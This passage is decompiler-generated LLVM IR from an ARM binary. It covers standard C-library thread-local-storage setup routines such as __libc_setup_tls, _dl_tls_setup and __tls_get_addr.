  %v2_1892c = icmp eq i32 %v1_1892c, 0
  br i1 %v2_1892c, label %dec_label_pc_18970, label %dec_label_pc_18934

dec_label_pc_18934:                               ; preds = %dec_label_pc_1892c, %dec_label_pc_18920, %dec_label_pc_18918
  %v0_188bc13 = phi i32 [ %v1_18924, %dec_label_pc_1892c ], [ %v1_18924, %dec_label_pc_18920 ], [ %v1_18918, %dec_label_pc_18918 ]
  %v4_18934 = mul i32 %v1_18934, 256
  %v5_18934 = or i32 %v0_18934, %v4_18934
  %v1_18938 = add nuw nsw i32 %v0_18938, 1
  %v7_18940 = icmp slt i32 %v1_18938, 5
  br i1 %v7_18940, label %dec_label_pc_188bc, label %dec_label_pc_18944

dec_label_pc_18944:                               ; preds = %dec_label_pc_18934
  %v2_18944 = icmp eq i32 %v0_1889c, 0
  br i1 %v2_18944, label %.thread8.thread, label %bb

.thread8.thread:                                  ; preds = %dec_label_pc_18944
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18974

bb:                                               ; preds = %dec_label_pc_18944
  %v4_18948 = udiv i32 %v5_18934, 16777216
  %v2_1894c = udiv i32 %v5_18934, 256
  %v5_18950 = and i32 %v2_1894c, 65280
  %v2_18954 = and i32 %v5_18934, 65280
  %v5_18958 = mul nuw nsw i32 %v2_18954, 256
  %v5_1895c = mul i32 %v0_18934, 16777216
  %v6_18950 = or i32 %v4_18948, %v5_1895c
  %v6_18958 = or i32 %v6_18950, %v5_18950
  %v6_1895c = or i32 %v6_18958, %v5_18958
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_18968 = inttoptr i32 %v0_1889c to i32*
  store i32 %v6_1895c, i32* %v3_18968, align 4
  %v2_18974.pre = load i32, i32* %stack_var_-28, align 4
  %v1_18978.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18974

dec_label_pc_18970:                               ; preds = %dec_label_pc_18910, %dec_label_pc_1892c, %dec_label_pc_188bc, %dec_label_pc_188dc, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18974

dec_label_pc_18974:                               ; preds = %.thread8.thread, %bb, %dec_label_pc_18970
  %v1_18978 = phi i32 [ %v1_18978.pre, %bb ], [ 0, %dec_label_pc_18970 ], [ 1, %.thread8.thread ]
  %v2_18974 = phi i32 [ %v2_18974.pre, %bb ], [ %v3_1888c, %dec_label_pc_18970 ], [ %v3_1888c, %.thread8.thread ]
  store i32 %v2_18974, i32* @r4, align 4
  ret i32 %v1_18978

; uselistorder directives
  uselistorder i32 %v1_18938, { 1, 0 }
  uselistorder i32 %v5_18934, { 2, 0, 1, 3 }
  uselistorder i32 %v0_18924, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 6, 4, 1, 2, 3 }
  uselistorder i32 65280, { 64, 0, 5, 1, 2, 6, 7, 8, 9, 10, 36, 44, 45, 46, 11, 12, 13, 47, 48, 14, 15, 16, 17, 37, 49, 3, 50, 51, 18, 19, 38, 52, 53, 39, 20, 21, 22, 23, 24, 54, 55, 56, 57, 40, 41, 42, 4, 58, 59, 25, 60, 26, 27, 28, 29, 43, 61, 30, 31, 32, 62, 33, 34, 35, 63, 65, 66 }
  uselistorder i8 46, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 255, { 4, 5, 0, 1, 2, 16, 17, 19, 18, 20, 6, 21, 3, 9, 22, 10, 23, 7, 24, 8, 25, 13, 26, 14, 27, 11, 28, 12, 29, 15, 30 }
  uselistorder i16 0, { 0, 1, 3, 4, 2, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder label %dec_label_pc_18974, { 2, 1, 0 }
  uselistorder label %dec_label_pc_18970, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_188f4, { 1, 0 }
  uselistorder label %dec_label_pc_188bc, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v3_18990 = load i32, i32* @r4, align 4
  store i32 %v3_18990, i32* %stack_var_-16, align 4
  %v4_18994 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 72) to i32*), align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v4_1899c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 60) to i32*), align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_189a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 36) to i32*), align 4
  store i32 %v4_189a4, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_189ac = inttoptr i32 %v4_18994 to i32*
  %v2_189ac = load i32, i32* %v1_189ac, align 4
  %v4_189b0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 52) to i32*), align 4
  store i32 %v4_189b0, i32* %lr.global-to-local, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v1_189b8 = add i32 %v2_189ac, 15
  %v4_189bc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 144) to i32*), align 4
  store i32 %v4_189bc, i32* @ip, align 4
  %v1_189c0 = load i32, i32* @r0, align 4
  %v2_189c0 = add i32 %v1_189c0, %v1_189b8
  %v1_189c4 = inttoptr i32 %v4_1899c to i32*
  %v2_189c4 = load i32, i32* %v1_189c4, align 4
  store i32 %v2_189c4, i32* %r3.global-to-local, align 4
  %v1_189c8 = and i32 %v2_189c0, -16
  store i32 %v1_189c8, i32* %v1_189ac, align 4
  %v0_189d0 = load i32, i32* @r0, align 4
  %v1_189d0 = load i32, i32* %r4.global-to-local, align 4
  %v2_189d0 = inttoptr i32 %v1_189d0 to i32*
  store i32 %v0_189d0, i32* %v2_189d0, align 4
  %v0_189d4 = load i32, i32* @r1, align 4
  %v1_189d4 = load i32, i32* %lr.global-to-local, align 4
  %v2_189d4 = inttoptr i32 %v1_189d4 to i32*
  store i32 %v0_189d4, i32* %v2_189d4, align 4
  %v0_189d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_189d8 = load i32, i32* @ip, align 4
  %v2_189d8 = inttoptr i32 %v1_189d8 to i32*
  store i32 %v0_189d8, i32* %v2_189d8, align 4
  %v2_189dc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_189dc, i32* %r4.global-to-local, align 4
  %v1_189e0 = load i32, i32* @r0, align 4
  ret i32 %v1_189e0

; uselistorder directives
  uselistorder i32 -16, { 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
}

define i32 @function_189e8(i32 %arg1) local_unnamed_addr {
dec_label_pc_189e8:
  %v0_189e8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_189e8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_189e8
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_189e8, %bb
  %v4_189f8 = phi i32 [ %arg1, %dec_label_pc_189e8 ], [ 0, %bb ]
  ret i32 %v4_189f8

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %r3.global-to-local, align 4
  %v4_18a0c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 84) to i32*), align 4
  store i32 %v4_18a0c, i32* @lr, align 4
  %v4_18a18 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 60) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 10752) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 10752), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_18a38 = inttoptr i32 %v4_18a18 to i32*
  store i32 1, i32* %v2_18a38, align 4
  %v0_18a3c = load i32, i32* %r3.global-to-local, align 4
  %v1_18a3c = load i32, i32* @lr, align 4
  %v2_18a3c = inttoptr i32 %v1_18a3c to i32*
  store i32 %v0_18a3c, i32* %v2_18a3c, align 4
  %v0_18a40 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_18a58(i32 %arg1) local_unnamed_addr {
dec_label_pc_18a58:
  %v0_18a58 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_18a58, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_18a58
  %v2_18a58 = load i32, i32* @r4, align 4
  %v8_18a58 = ashr i32 %v2_18a58, %arg1
  %v9_18a58 = and i32 %v8_18a58, %arg1
  %v2_18a5c = load i32, i32* @ip, align 4
  %v8_18a5c = lshr i32 %v2_18a5c, %v9_18a58
  %v9_18a5c = and i32 %v8_18a5c, %v9_18a58
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_18a58, %bb
  %v7_18a60 = phi i32 [ %arg1, %dec_label_pc_18a58 ], [ %v9_18a5c, %bb ]
  ret i32 %v7_18a60

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_18a6c = call i32 @__aeabi_read_tp()
  %v1_18a70 = inttoptr i32 %v0_18a6c to i32*
  %v2_18a70 = load i32, i32* %v1_18a70, align 4
  %v1_18a74 = add i32 %arg1, 4
  %v2_18a74 = inttoptr i32 %v1_18a74 to i32*
  %v3_18a74 = load i32, i32* %v2_18a74, align 4
  %v1_18a78 = add i32 %v2_18a70, 8
  %v2_18a78 = inttoptr i32 %v1_18a78 to i32*
  %v3_18a78 = load i32, i32* %v2_18a78, align 4
  %v2_18a7c = add i32 %v3_18a78, %v3_18a74
  ret i32 %v2_18a7c
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_18a88 = load i32, i32* @r4, align 4
  store i32 %v3_18a88, i32* %stack_var_-36, align 4
  %v6_18a88 = load i32, i32* @r5, align 4
  %v15_18a88 = load i32, i32* @r8, align 4
  %v18_18a88 = load i32, i32* @sb, align 4
  %v21_18a88 = load i32, i32* @sl, align 4
  %v24_18a88 = load i32, i32* @fp, align 4
  %v27_18a88 = load i32, i32* @lr, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23378.488 to i32), i32* %sl.global-to-local, align 4
  %v4_18a98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 104) to i32*), align 4
  store i32 %v4_18a98, i32* %r3.global-to-local, align 4
  %v1_18a9c = inttoptr i32 %v4_18a98 to i32*
  %v2_18a9c = load i32, i32* %v1_18a9c, align 4
  store i32 %v2_18a9c, i32* %r2.global-to-local, align 4
  %v2_18aa0 = icmp eq i32 %v2_18a9c, 0
  %v0_18aa8 = load i32, i32* %r0.global-to-local, align 4
  %v0_18aac = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_18aac, i32* %ip.global-to-local, align 4
  br i1 %v2_18aa0, label %dec_label_pc_18c74, label %dec_label_pc_18ab4

dec_label_pc_18ab4:                               ; preds = %entry
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_18ab8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_23378.488 to i32), i32 156) to i32*), align 4
  store i32 %v4_18ab8, i32* @lr, align 4
  store i32 %v2_18a9c, i32* %r1.global-to-local, align 4
  %v1_18b00 = inttoptr i32 %v4_18ab8 to i32*
  %v2_18b0061 = load i32, i32* %v1_18b00, align 4
  %v4_18b0462 = mul i32 %v2_18b0061, 32
  %v5_18b0463 = add i32 %v4_18b0462, %v2_18a9c
  store i32 %v5_18b0463, i32* %r3.global-to-local, align 4
  %v3_18b0865 = icmp ult i32 %v2_18a9c, %v5_18b0463
  br i1 %v3_18b0865, label %dec_label_pc_18ac4, label %dec_label_pc_18c74.loopexit

dec_label_pc_18ac4:                               ; preds = %dec_label_pc_18ab4, %dec_label_pc_18afc
  %v0_18adc66 = phi i32 [ %v1_18afc, %dec_label_pc_18afc ], [ %v2_18a9c, %dec_label_pc_18ab4 ]
  %v1_18ac4 = inttoptr i32 %v0_18adc66 to i32*
  %v2_18ac4 = load i32, i32* %v1_18ac4, align 4
  store i32 %v2_18ac4, i32* %r3.global-to-local, align 4
  %v7_18ac8 = icmp eq i32 %v2_18ac4, 7
  br i1 %v7_18ac8, label %dec_label_pc_18ad0, label %dec_label_pc_18afc

dec_label_pc_18ad0:                               ; preds = %dec_label_pc_18ac4
  %v1_18ad0 = add i32 %v0_18adc66, 20
  %v2_18ad0 = inttoptr i32 %v1_18ad0 to i32*
  %v3_18ad0 = load i32, i32* %v2_18ad0, align 4
  store i32 %v3_18ad0, i32* %r3.global-to-local, align 4
  %v1_18ad4 = add i32 %v0_18adc66, 28
  %v2_18ad4 = inttoptr i32 %v1_18ad4 to i32*
  %v3_18ad4 = load i32, i32* %v2_18ad4, align 4
  store i32 %v3_18ad4, i32* @r6, align 4
  %v1_18adc = add i32 %v0_18adc66, 16
  %v2_18adc = inttoptr i32 %v1_18adc to i32*
  %v3_18adc = load i32, i32* %v2_18adc, align 4
  store i32 %v3_18adc, i32* %r3.global-to-local, align 4
  %v1_18ae0 = add i32 %v0_18adc66, 8
  %v2_18ae0 = inttoptr i32 %v1_18ae0 to i32*
  %v3_18ae0 = load i32, i32* %v2_18ae0, align 4
  store i32 %v3_18ae0, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_18ad4, %v0_18aac
  %v0_18aac.v3_18ad4 = select i1 %tmp78, i32 %v0_18aac, i32 %v3_18ad4
  store i32 %v0_18aac.v3_18ad4, i32* %fp.global-to-local, align 4
  %v2_18b18 = icmp eq i32 %v3_18ad4, 0
  br i1 %v2_18b18, label %dec_label_pc_18b40, label %bb

dec_label_pc_18afc:                               ; preds = %dec_label_pc_18ac4
  %v1_18afc = add i32 %v0_18adc66, 32
  store i32 %v1_18afc, i32* %r1.global-to-local, align 4
  %v2_18b00 = load i32, i32* %v1_18b00, align 4
  %v4_18b04 = mul i32 %v2_18b00, 32
  %v5_18b04 = add i32 %v4_18b04, %v2_18a9c
  store i32 %v5_18b04, i32* %r3.global-to-local, align 4
  %v3_18b08 = icmp ult i32 %v1_18afc, %v5_18b04
  br i1 %v3_18b08, label %dec_label_pc_18ac4, label %dec_label_pc_18b00.dec_label_pc_18c74.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_18ad0
  %v2_18b1c = add i32 %v3_18ad4, -1
  br label %dec_label_pc_18b44

dec_label_pc_18b40:                               ; preds = %dec_label_pc_18ad0, %dec_label_pc_18c74
  %v0_18b54.pre = phi i32 [ %v0_18b54.pre.pre, %dec_label_pc_18c74 ], [ ptrtoint (i32* @global_var_23378.488 to i32), %dec_label_pc_18ad0 ]
  %v1_18b44.pre = phi i32 [ %v1_18b44.pre.pre, %dec_label_pc_18c74 ], [ %v0_18aa8, %dec_label_pc_18ad0 ]
  %v1_18b6825 = phi i32 [ %v0_18c7c, %dec_label_pc_18c74 ], [ %v0_18aac.v3_18ad4, %dec_label_pc_18ad0 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_18c74 ], [ %v3_18ad0, %dec_label_pc_18ad0 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_18c74 ], [ %v3_18adc, %dec_label_pc_18ad0 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_18c74 ], [ %v3_18ae0, %dec_label_pc_18ad0 ]
  br label %dec_label_pc_18b44

dec_label_pc_18b44:                               ; preds = %bb, %dec_label_pc_18b40
  %storemerge80 = phi i32 [ %v2_18b1c, %bb ], [ 0, %dec_label_pc_18b40 ]
  %v0_18b44 = phi i32 [ %v2_18b1c, %bb ], [ 0, %dec_label_pc_18b40 ]
  %storemerge = phi i32 [ %v3_18ad4, %bb ], [ 1, %dec_label_pc_18b40 ]
  %storemerge79 = phi i32 [ %v3_18ad4, %bb ], [ 1, %dec_label_pc_18b40 ]
  %v0_18b54 = phi i32 [ ptrtoint (i32* @global_var_23378.488 to i32), %bb ], [ %v0_18b54.pre, %dec_label_pc_18b40 ]
  %v1_18b44 = phi i32 [ %v0_18aa8, %bb ], [ %v1_18b44.pre, %dec_label_pc_18b40 ]
  %v1_18b68 = phi i32 [ %v0_18aac.v3_18ad4, %bb ], [ %v1_18b6825, %dec_label_pc_18b40 ]
  %stack_var_-52.3 = phi i32 [ %v3_18ad0, %bb ], [ %stack_var_-52.0, %dec_label_pc_18b40 ]
  %stack_var_-48.3 = phi i32 [ %v3_18adc, %bb ], [ %stack_var_-48.0, %dec_label_pc_18b40 ]
  %stack_var_-44.3 = phi i32 [ %v3_18ae0, %bb ], [ %stack_var_-44.0, %dec_label_pc_18b40 ]
  store i32 %storemerge80, i32* %r0.global-to-local, align 4
  store i32 %storemerge79, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* @r4, align 4
  %v2_18b44 = add i32 %v1_18b44, %v0_18b44
  %v2_18b48 = udiv i32 %v2_18b44, %storemerge
  store i32 %v2_18b48, i32* %r0.global-to-local, align 4
  %v2_18b4c = mul i32 %v2_18b48, %storemerge
  store i32 %v2_18b4c, i32* %sb.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v2_18b54 = add i32 %v0_18b54, 72
  %v3_18b54 = inttoptr i32 %v2_18b54 to i32*
  %v4_18b54 = load i32, i32* %v3_18b54, align 4
  store i32 %v4_18b54, i32* %r3.global-to-local, align 4
  %v1_18b58 = inttoptr i32 %v4_18b54 to i32*
  %v2_18b58 = load i32, i32* %v1_18b58, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v1_18b60 = add i32 %v1_18b68, 1168
  %v2_18b64 = add i32 %v1_18b60, %stack_var_-52.3
  %v2_18b68 = add i32 %v2_18b64, %v2_18b4c
  %v2_18b6c = add i32 %v2_18b68, %v2_18b58
  store i32 %v2_18b6c, i32* %r0.global-to-local, align 4
  %v1_18b70 = call i32 @__GI_sbrk(i32 %v2_18b6c)
  %v1_18b74 = load i32, i32* %fp.global-to-local, align 4
  %v1_18b7c = sub i32 0, %v1_18b74
  store i32 10240, i32* %r4.global-to-local, align 4
  %v2_18b74 = add i32 %v1_18b70, 1167
  %v1_18b84 = add i32 %v2_18b74, %v1_18b74
  %v2_18b88 = and i32 %v1_18b84, %v1_18b7c
  store i32 %v2_18b88, i32* @r5, align 4
  %v1_18b90 = load i32, i32* %sl.global-to-local, align 4
  %v3_18b90 = add i32 %v1_18b90, 10240
  %v4_18b90 = inttoptr i32 %v3_18b90 to i32*
  store i32 62, i32* %v4_18b90, align 4
  %v0_18b98 = load i32, i32* @r5, align 4
  %v1_18b98 = load i32, i32* %sb.global-to-local, align 4
  %v2_18b98 = add i32 %v1_18b98, %v0_18b98
  store i32 %v2_18b98, i32* @ip, align 4
  %v0_18b9c = load i32, i32* %sl.global-to-local, align 4
  %v1_18b9c = load i32, i32* %r4.global-to-local, align 4
  %v2_18b9c = add i32 %v1_18b9c, %v0_18b9c
  store i32 %v2_18b9c, i32* %r4.global-to-local, align 4
  %v2_18ba0 = add i32 %v0_18b9c, 11528
  store i32 %v2_18ba0, i32* %r8.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  store i32 %stack_var_-44.3, i32* @r1, align 4
  store i32 %stack_var_-48.3, i32* @r2, align 4
  store i32 %v2_18b98, i32* @r0, align 4
  %v2_18bb4 = add i32 %v2_18b9c, 16
  %v3_18bb4 = inttoptr i32 %v2_18bb4 to i32*
  store i32 %v2_18b98, i32* %v3_18bb4, align 4
  %v0_18bb8 = load i32, i32* %sb.global-to-local, align 4
  %v1_18bb8 = load i32, i32* %r8.global-to-local, align 4
  %v2_18bb8 = add i32 %v1_18bb8, 40
  %v3_18bb8 = inttoptr i32 %v2_18bb8 to i32*
  store i32 %v0_18bb8, i32* %v3_18bb8, align 4
  %v0_18bbc = load i32, i32* @r3, align 4
  %v1_18bbc = trunc i32 %v0_18bbc to i8
  %v2_18bbc = load i32, i32* %r4.global-to-local, align 4
  %v3_18bbc = add i32 %v2_18bbc, 20
  %v4_18bbc = inttoptr i32 %v3_18bbc to i8*
  store i8 %v1_18bbc, i8* %v4_18bbc, align 1
  %v0_18bc0 = load i32, i32* %r4.global-to-local, align 4
  %v1_18bc0 = add i32 %v0_18bc0, 8
  store i32 %v1_18bc0, i32* @r4, align 4
  %v0_18bc4 = call i32 @memcpy()
  %v0_18bcc = load i32, i32* @r4, align 4
  %v1_18bcc = load i32, i32* @r5, align 4
  %v2_18bcc = inttoptr i32 %v1_18bcc to i32*
  store i32 %v0_18bcc, i32* %v2_18bcc, align 4
  %v0_18bd0 = load i32, i32* @r5, align 4
  store i32 %v0_18bd0, i32* %r0.global-to-local, align 4
  %tmp = icmp ugt i32 %v0_18bd0, -4096
  call void @__pseudo_cond_branch(i1 %tmp, i32 ptrtoint (i32* @global_var_146d8.676 to i32))
  store i32 84, i32* %r3.global-to-local, align 4
  %v0_18be4 = load i32, i32* %sl.global-to-local, align 4
  %v2_18be4 = add i32 %v0_18be4, 84
  %v3_18be4 = inttoptr i32 %v2_18be4 to i32*
  %v4_18be4 = load i32, i32* %v3_18be4, align 4
  store i32 %v4_18be4, i32* %ip.global-to-local, align 4
  store i32 60, i32* %r3.global-to-local, align 4
  store i32 10752, i32* %r1.global-to-local, align 4
  %v2_18bf0 = add i32 %v0_18be4, 60
  %v3_18bf0 = inttoptr i32 %v2_18bf0 to i32*
  %v4_18bf0 = load i32, i32* %v3_18bf0, align 4
  store i32 %v4_18bf0, i32* %r0.global-to-local, align 4
  %v3_18bf8 = add i32 %v0_18be4, 10752
  %v4_18bf8 = inttoptr i32 %v3_18bf8 to i32*
  store i32 64, i32* %v4_18bf8, align 4
  %v1_18c00 = load i32, i32* %r8.global-to-local, align 4
  %v2_18c00 = add i32 %v1_18c00, 20
  %v3_18c00 = inttoptr i32 %v2_18c00 to i32*
  store i32 %stack_var_-44.3, i32* %v3_18c00, align 4
  %v1_18c08 = load i32, i32* %r8.global-to-local, align 4
  %v2_18c08 = add i32 %v1_18c08, 24
  %v3_18c08 = inttoptr i32 %v2_18c08 to i32*
  store i32 %stack_var_-48.3, i32* %v3_18c08, align 4
  %v1_18c10 = load i32, i32* %r0.global-to-local, align 4
  %v2_18c10 = inttoptr i32 %v1_18c10 to i32*
  store i32 1, i32* %v2_18c10, align 4
  %v1_18c18 = load i32, i32* %r8.global-to-local, align 4
  %v2_18c18 = add i32 %v1_18c18, 28
  %v3_18c18 = inttoptr i32 %v2_18c18 to i32*
  store i32 %stack_var_-52.3, i32* %v3_18c18, align 4
  %v0_18c20 = load i32, i32* @r6, align 4
  %v2_18c20 = icmp eq i32 %v0_18c20, 0
  %v1_18c24 = load i32, i32* %r8.global-to-local, align 4
  %v2_18c24 = add i32 %v1_18c24, 44
  %v3_18c24 = inttoptr i32 %v2_18c24 to i32*
  store i32 1, i32* %v3_18c24, align 4
  store i32 %stack_var_-52.3, i32* %r3.global-to-local, align 4
  %v0_18c2c = load i32, i32* %sl.global-to-local, align 4
  %v1_18c2c = load i32, i32* %r1.global-to-local, align 4
  %v2_18c2c = add i32 %v1_18c2c, %v0_18c2c
  store i32 %v2_18c2c, i32* %r2.global-to-local, align 4
  %v1_18c30 = load i32, i32* @r6, align 4
  br i1 %v2_18c20, label %.thread33, label %bb52

.thread33:                                        ; preds = %dec_label_pc_18b44
  store i32 %v1_18c30, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_18c3c34 = load i32, i32* %r8.global-to-local, align 4
  %v2_18c3c35 = add i32 %v1_18c3c34, 32
  %v3_18c3c36 = inttoptr i32 %v2_18c3c35 to i32*
  store i32 %v1_18c30, i32* %v3_18c3c36, align 4
  br label %bb53

bb52:                                             ; preds = %dec_label_pc_18b44
  %v2_18c34 = add i32 %v1_18c30, -1
  store i32 %v2_18c34, i32* %r0.global-to-local, align 4
  %v1_18c3c = load i32, i32* %r8.global-to-local, align 4
  %v2_18c3c = add i32 %v1_18c3c, 32
  %v3_18c3c = inttoptr i32 %v2_18c3c to i32*
  store i32 %v1_18c30, i32* %v3_18c3c, align 4
  %v1_18c40 = load i32, i32* @r6, align 4
  store i32 %v1_18c40, i32* %r1.global-to-local, align 4
  br label %bb53

bb53:                                             ; preds = %.thread33, %bb52
  %v0_18c44 = load i32, i32* %r8.global-to-local, align 4
  %v1_18c44 = load i32, i32* %r2.global-to-local, align 4
  %v2_18c44 = add i32 %v1_18c44, 28
  %v3_18c44 = inttoptr i32 %v2_18c44 to i32*
  store i32 %v0_18c44, i32* %v3_18c44, align 4
  %v0_18c48 = load i32, i32* %r2.global-to-local, align 4
  %v1_18c48 = load i32, i32* %ip.global-to-local, align 4
  %v2_18c48 = inttoptr i32 %v1_18c48 to i32*
  store i32 %v0_18c48, i32* %v2_18c48, align 4
  %v0_18c4c = load i32, i32* %r0.global-to-local, align 4
  %v1_18c4c = load i32, i32* %r3.global-to-local, align 4
  %v2_18c4c = add i32 %v1_18c4c, %v0_18c4c
  store i32 %v2_18c4c, i32* %r0.global-to-local, align 4
  %v1_18c50 = load i32, i32* %r1.global-to-local, align 4
  br i1 %v2_18c20, label %bb54, label %._crit_edge

._crit_edge:                                      ; preds = %bb53
  %v0_18c58.pre = load i32, i32* @r6, align 4
  br label %bb55

bb54:                                             ; preds = %bb53
  br label %bb55

bb55:                                             ; preds = %._crit_edge, %bb54
  %v0_18c58 = phi i32 [ %v0_18c58.pre, %._crit_edge ], [ %v1_18c50, %bb54 ]
  %v2_18c54 = udiv i32 %v2_18c4c, %v1_18c50
  %v2_18c58 = load i32, i32* %sb.global-to-local, align 4
  %v3_18c58 = mul i32 %v2_18c54, %v0_18c58
  %v4_18c58 = add i32 %v2_18c58, %v3_18c58
  store i32 %v4_18c58, i32* @r0, align 4
  %v0_18c5c = load i32, i32* %fp.global-to-local, align 4
  %v2_18c5c = icmp ult i32 %v0_18c5c, 16
  %v0_18c5c. = select i1 %v2_18c5c, i32 16, i32 %v0_18c5c
  store i32 %v0_18c5c., i32* @r1, align 4
  %v2_18c6c = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_18c6c, i32* @r4, align 4
  store i32 %v6_18a88, i32* @r5, align 4
  store i32 %v15_18a88, i32* %r8.global-to-local, align 4
  store i32 %v18_18a88, i32* %sb.global-to-local, align 4
  store i32 %v21_18a88, i32* %sl.global-to-local, align 4
  store i32 %v24_18a88, i32* %fp.global-to-local, align 4
  store i32 %v27_18a88, i32* @lr, align 4
  %v0_18c70 = call i32 @init_static_tls()
  store i32 %v0_18c70, i32* %r0.global-to-local, align 4
  %v0_18c7c.pre = load i32, i32* @ip, align 4
  %v1_18b44.pre.pre.pre = load i32, i32* @r5, align 4
  %v0_18b54.pre.pre.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_18c74

dec_label_pc_18b00.dec_label_pc_18c74.loopexit_crit_edge: ; preds = %dec_label_pc_18afc
  br label %dec_label_pc_18c74.loopexit

dec_label_pc_18c74.loopexit:                      ; preds = %dec_label_pc_18b00.dec_label_pc_18c74.loopexit_crit_edge, %dec_label_pc_18ab4
  br label %dec_label_pc_18c74

dec_label_pc_18c74:                               ; preds = %dec_label_pc_18c74.loopexit, %entry, %bb55
  %v0_18b54.pre.pre = phi i32 [ ptrtoint (i32* @global_var_23378.488 to i32), %dec_label_pc_18c74.loopexit ], [ ptrtoint (i32* @global_var_23378.488 to i32), %entry ], [ %v0_18b54.pre.pre.pre, %bb55 ]
  %v1_18b44.pre.pre = phi i32 [ %v0_18aa8, %dec_label_pc_18c74.loopexit ], [ %v0_18aa8, %entry ], [ %v1_18b44.pre.pre.pre, %bb55 ]
  %v0_18c7c = phi i32 [ %v0_18aac, %dec_label_pc_18c74.loopexit ], [ %v0_18aac, %entry ], [ %v0_18c7c.pre, %bb55 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 %v0_18c7c, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_18b40

; uselistorder directives
  uselistorder i32 %v0_18c7c, { 1, 0 }
  uselistorder i32 %v1_18c30, { 1, 0, 2, 3 }
  uselistorder i32 %v0_18b9c, { 1, 0 }
  uselistorder i32 %v2_18b98, { 1, 0, 2 }
  uselistorder i32 %stack_var_-52.3, { 1, 2, 0, 3 }
  uselistorder i32 %v1_18afc, { 2, 1, 0 }
  uselistorder i32 %v3_18ad4, { 1, 0, 4, 5, 3, 2, 6 }
  uselistorder i32 %v0_18adc66, { 4, 1, 0, 3, 2, 5 }
